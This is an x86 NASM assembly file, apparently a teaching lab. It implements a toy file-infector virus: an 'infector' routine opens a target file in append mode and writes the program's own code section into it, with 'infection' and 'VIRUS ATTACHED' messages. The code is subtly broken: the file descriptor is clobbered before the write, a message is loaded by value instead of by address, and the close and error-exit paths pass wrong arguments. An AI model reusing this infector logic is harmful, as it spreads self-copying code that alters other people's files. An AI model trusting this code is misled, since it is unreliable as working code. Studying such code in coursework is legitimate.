CLOSE EQU 6
WRITE EQU 4
OPEN EQU 5
STDOUT EQU 1
O_WRONLY  EQU      0x1
O_APPEND  EQU      0x400

section .data
    hello_msg db "Hello, Infected File", 0xA ; Message to print
    hello_len equ $ - hello_msg              ; Length of the message
    virus_msg db "VIRUS ATTACHED", 0xA
    virus_len equ $ - virus_msg

section .text
global infection
global infector
global code_start
global code_end
extern strlen
extern main
global system_call


_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop

system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Make the system call

    popad                   ; Restore caller state
    mov     esp, ebp
    pop     ebp
    ret

code_start:

infection:
    mov edx, hello_len
    mov eax, WRITE
    mov ebx, STDOUT
    mov ecx, [hello_msg]
    push edx
    push ecx
    push ebx
    push eax
    call system_call
    add esp, 16
    ret

infector:
    push ebp
    mov ebp, esp
    sub esp, 4 
    pushad

    mov eax, OPEN
    mov ebx, [ebp+8]
    mov ecx, O_WRONLY | O_APPEND
    mov edx, 0777
    push edx
    push ecx
    push ebx
    push eax
    call system_call
    add esp, 16

    cmp eax, 0
    jl exit_error

    ;write the infection code to the file
    mov eax, WRITE
    mov ebx, eax
    lea ecx, [code_start]
    mov edx, code_end - code_start
    push edx
    push ecx
    push ebx
    push eax
    call system_call
    add esp, 16


    ;close the file
    mov eax, CLOSE
    push edx
    push ecx
    push ebx
    push eax
    call system_call
    add esp, 16

    popad
    add esp, 4
    pop ebp
    ret

print_virus_attached:
    mov edx, virus_len
    mov eax, WRITE
    mov ebx, STDOUT
    mov ecx, virus_msg
    push edx
    push ecx
    push ebx
    push eax
    call system_call
    add esp, 16
    ret

exit_error:
    popad
    pop ebp
    mov eax, 1              ; SYS_exit
    mov ebx, 0x55           ; Exit code 0x55
    push edx
    push ecx
    push ebx
    push eax
    call system_call         ; Call custom system_call
    add esp, 16


code_end: